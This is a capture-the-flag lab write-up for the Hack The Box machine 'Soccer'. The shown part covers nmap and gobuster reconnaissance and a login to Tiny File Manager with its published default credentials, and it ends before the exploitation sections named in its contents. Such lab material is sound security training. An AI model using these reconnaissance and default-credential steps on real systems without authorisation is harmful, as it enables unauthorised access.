<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self'; form-action 'self'; frame-src 'self'; img-src 'self' data: https://*.google-analytics.com https://*.googletagmanager.com; object-src 'none'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://*.googletagmanager.com; prefetch-src 'self'; connect-src 'self' https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB Writeup: Soccer | woadey</title>
<meta name=keywords content="htb,hackthebox,writeup,Soccer"><meta name=description content="Writeup for Hack The Box – Soccer"><meta name=author content><link rel=canonical href=https://woadey.xyz/posts/htb/easy/soccer/><link crossorigin=anonymous href=/assets/css/stylesheet.801c837919c19cf5e5fa2a539102b0d85b20f9320cf20c026268a4419d9c0537.css integrity="sha256-gByDeRnBnPXl+ipTkQKw2Fsg+TIM8gwCYmikQZ2cBTc=" rel="preload stylesheet" as=style><link rel=icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-32x32.png><link rel=apple-touch-icon href=https://woadey.xyz/favicon/white_pink_bg/apple-touch-icon.png><link rel=mask-icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://woadey.xyz/posts/htb/easy/soccer/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9703667233476494" crossorigin=anonymous></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-EF924K1NXR"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EF924K1NXR",{anonymize_ip:!1})}</script><meta property="og:title" content="HTB Writeup: Soccer"><meta property="og:description" content="Writeup for Hack The Box – Soccer"><meta property="og:type" content="article"><meta property="og:url" content="https://woadey.xyz/posts/htb/easy/soccer/"><meta property="og:image" content="https://woadey.xyz/images/Soccer.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-09T11:50:42-04:00"><meta property="article:modified_time" content="2023-04-09T11:50:42-04:00"><meta property="og:site_name" content="woadey's blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://woadey.xyz/images/Soccer.png"><meta name=twitter:title content="HTB Writeup: Soccer"><meta name=twitter:description content="Writeup for Hack The Box – Soccer"><meta name=twitter:site content="@woadey_"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"posts","item":"https://woadey.xyz/posts/"},{"@type":"ListItem","position":2,"name":"HTB Writeup: Soccer","item":"https://woadey.xyz/posts/htb/easy/soccer/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB Writeup: Soccer","name":"HTB Writeup: Soccer","description":"Writeup for Hack The Box – Soccer","keywords":["htb","hackthebox","writeup","Soccer"],"articleBody":"nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 # Nmap 7.92 scan initiated Sun Apr 9 11:53:01 2023 as: nmap -sC -sV -oA nmap/soccer -T4 10.10.11.194 Nmap scan report for 10.10.11.194 Host is up (0.019s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA) | 256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA) |_ 256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) 9091/tcp open xmltec-xmlmail? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src 'none' | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 139 | Date: Sun, 09 Apr 2023 15:53:13 GMT | Connection: close | \u003c!DOCTYPE html\u003e | ","wordCount":"791","inLanguage":"en","image":"https://woadey.xyz/images/Soccer.png","datePublished":"2023-04-09T11:50:42-04:00","dateModified":"2023-04-09T11:50:42-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://woadey.xyz/posts/htb/easy/soccer/"},"publisher":{"@type":"Organization","name":"woadey","logo":{"@type":"ImageObject","url":"https://woadey.xyz/favicon/pink_trans_bg/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://woadey.xyz/ accesskey=h title="oadey (Alt + H)"><img src=/images/pink.jpeg srcset="/images/pink_hu5661c188f24668226bb80c6208008ab1_117796_0x32_resize_q75_h2_box.webp 32w, /images/pink_hu5661c188f24668226bb80c6208008ab1_117796_64x0_resize_q75_h2_box.webp 120w" sizes=32px height=32 width=32 alt=logo aria-label=logo>
oadey</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://woadey.xyz/posts/ title=posts><span>posts</span></a></li><li><a href=https://woadey.xyz/categories/ title=categories><span>categories</span></a></li><li><a href=https://woadey.xyz/tags/ title=tags><span>tags</span></a></li><li><a href=https://woadey.xyz/archives/ title=archives><span>archives</span></a></li><li><a href=https://woadey.xyz/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://woadey.xyz/>home</a>&nbsp;»&nbsp;<a href=https://woadey.xyz/posts/>posts</a></div><h1 class="post-title entry-hint-parent">HTB Writeup: Soccer</h1><div class=post-description>Writeup for Hack The Box – Soccer</div><div class=post-meta><span title='2023-04-09 11:50:42 -0400 -0400'>April 9, 2023</span>&nbsp;·&nbsp;4 min</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li><a href=#nmap>nmap</a></li><li><a href=#gobuster>gobuster</a></li><li><a href=#vhost>vhost</a></li><li><a href=#http>http</a></li><li><a href=#cve-2021-45010>CVE-2021-45010</a></li><li><a href=#privesc>privesc</a></li><li><a href=#flag>Flag</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h3 id=nmap>nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Sun Apr  9 11:53:01 2023 as: nmap -sC -sV -oA nmap/soccer -T4 10.10.11.194</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.194
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.019s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE         VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http            nginx 1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://soccer.htb/
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>9091/tcp open  xmltec-xmlmail?
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings:
</span></span><span class=line><span class=cl><span class=p>|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> Bad Request
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest:
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>404</span> Not Found
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Security-Policy: default-src <span class=s1>&#39;none&#39;</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     X-Content-Type-Options: nosniff
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>139</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>09</span> Apr <span class=m>2023</span> 15:53:13 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;html <span class=nv>lang</span><span class=o>=</span><span class=s2>&#34;en&#34;</span>&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;head&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;meta <span class=nv>charset</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span>&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;title&gt;Error&lt;/title&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;/head&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;body&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;pre&gt;Cannot GET /&lt;/pre&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;/body&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;/html&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   HTTPOptions, RTSPRequest:
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>404</span> Not Found
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Security-Policy: default-src <span class=s1>&#39;none&#39;</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     X-Content-Type-Options: nosniff
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>143</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>09</span> Apr <span class=m>2023</span> 15:53:13 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;html <span class=nv>lang</span><span class=o>=</span><span class=s2>&#34;en&#34;</span>&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;head&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;meta <span class=nv>charset</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span>&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;title&gt;Error&lt;/title&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;/head&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;body&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;/body&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>_    &lt;/html&gt;
</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port9091-TCP:V<span class=o>=</span>7.92%I<span class=o>=</span>7%D<span class=o>=</span>4/9%Time<span class=o>=</span>6432DF64%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>inf
</span></span><span class=line><span class=cl>SF:ormix,2F,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
</span></span></span><span class=line><span class=cl><span class=s2>SF:n\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>drda,2F,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0close\r\n\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>GetRequest,168,<span class=s2>&#34;HTTP/1\.1\x20404\x20Not\x20Found\r\n
</span></span></span><span class=line><span class=cl><span class=s2>SF:Content-Security-Policy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Opt
</span></span></span><span class=line><span class=cl><span class=s2>SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
</span></span></span><span class=line><span class=cl><span class=s2>SF:tent-Length:\x20139\r\nDate:\x20Sun,\x2009\x20Apr\x202023\x2015:53:13\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=
</span></span></span><span class=line><span class=cl><span class=s2>SF:\&#34;en\&#34;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/h
</span></span></span><span class=line><span class=cl><span class=s2>SF:ead&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>HTT
</span></span><span class=line><span class=cl>SF:POptions,16C,<span class=s2>&#34;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
</span></span></span><span class=line><span class=cl><span class=s2>SF:cy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nC
</span></span></span><span class=line><span class=cl><span class=s2>SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
</span></span></span><span class=line><span class=cl><span class=s2>SF:\nDate:\x20Sun,\x2009\x20Apr\x202023\x2015:53:13\x20GMT\r\nConnection:\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n&lt;met
</span></span></span><span class=line><span class=cl><span class=s2>SF:a\x20charset=\&#34;utf-8\&#34;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Ca
</span></span></span><span class=line><span class=cl><span class=s2>SF:nnot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>RTSPRequest,16C,<span class=s2>&#34;HTT
</span></span></span><span class=line><span class=cl><span class=s2>SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
</span></span></span><span class=line><span class=cl><span class=s2>SF:c\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
</span></span></span><span class=line><span class=cl><span class=s2>SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sun,\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:2009\x20Apr\x202023\x2015:53:13\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;
</span></span></span><span class=line><span class=cl><span class=s2>SF:!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\&#34;ut
</span></span></span><span class=line><span class=cl><span class=s2>SF:f-8\&#34;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\x
</span></span></span><span class=line><span class=cl><span class=s2>SF:20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>RPCCheck,2F,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x20Request\r\nConnection:\x20close\r\n\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>DNSVersionBindReqTCP,2F,
</span></span><span class=line><span class=cl>SF:<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;</span><span class=o>)</span>%r
</span></span><span class=line><span class=cl>SF:<span class=o>(</span>DNSStatusRequestTCP,2F,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
</span></span></span><span class=line><span class=cl><span class=s2>SF:on:\x20close\r\n\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>Help,2F,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\
</span></span></span><span class=line><span class=cl><span class=s2>SF:nConnection:\x20close\r\n\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>SSLSessionReq,2F,<span class=s2>&#34;HTTP/1\.1\x20400\x2
</span></span></span><span class=line><span class=cl><span class=s2>SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Sun Apr  9 11:53:20 2023 -- 1 IP address (1 host up) scanned in 18.99 seconds</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=gobuster>gobuster<a hidden class=anchor aria-hidden=true href=#gobuster>#</a></h3><h4 id=subdirectories>subdirectories<a hidden class=anchor aria-hidden=true href=#subdirectories>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/soccer<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ sudo gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -o gobuster/subdirectories.out -z
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.2.0-dev
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://soccer.htb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.2.0-dev
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/04/09 11:55:47 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/tiny                 <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 178<span class=o>]</span> <span class=o>[</span>--&gt; http://soccer.htb/tiny/<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/04/09 11:56:31 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></td></tr></table></div></div><p>Found <code>/tiny</code> directory.</p><h3 id=vhost>vhost<a hidden class=anchor aria-hidden=true href=#vhost>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/soccer<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ sudo gobuster vhost -u http://soccer.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z -o gobuster/vhost.out
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.2.0-dev
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:             http://soccer.htb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:          GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:         <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:      gobuster/3.2.0-dev
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:         10s
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Append Domain:   <span class=nb>false</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/04/09 11:57:13 Starting gobuster in VHOST enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/04/09 11:57:23 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></td></tr></table></div></div><p>Nothing here.</p><h3 id=http>http<a hidden class=anchor aria-hidden=true href=#http>#</a></h3><p>After a quick glance at the <code>html</code> of the hosted website, there seems to be nothing really here other than the login page of <code>/tiny</code>. <code>Wappalyzer</code> shows some of the used technologies:</p><p><figure class=image-caption><img src=images/wapp.i.png alt=wappalyzer style=filter:var(--invert-img) loading=lazy><figcaption></figcaption></figure></p><p>After a bit of digging, I found <a href=https://github.com/prasathmani/tinyfilemanager title="this link" target=_blank rel="nofollow noopener">this link</a> which listed some default logins:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>admin:admin@123
</span></span><span class=line><span class=cl>user:12345
</span></span></code></pre></div><p>Both creds worked!</p><p><figure class=image-caption><img alt=tiny srcset="/posts/htb/easy/soccer/images/tiny_hu7fc8558242fa70e70e662c6ed2094438_104655_480x0_resize_q75_h2_box_3.webp 480w,
/posts/htb/easy/soccer/images/tiny_hu7fc8558242fa70e70e662c6ed2094438_104655_768x0_resize_q75_h2_box_3.webp 768w,
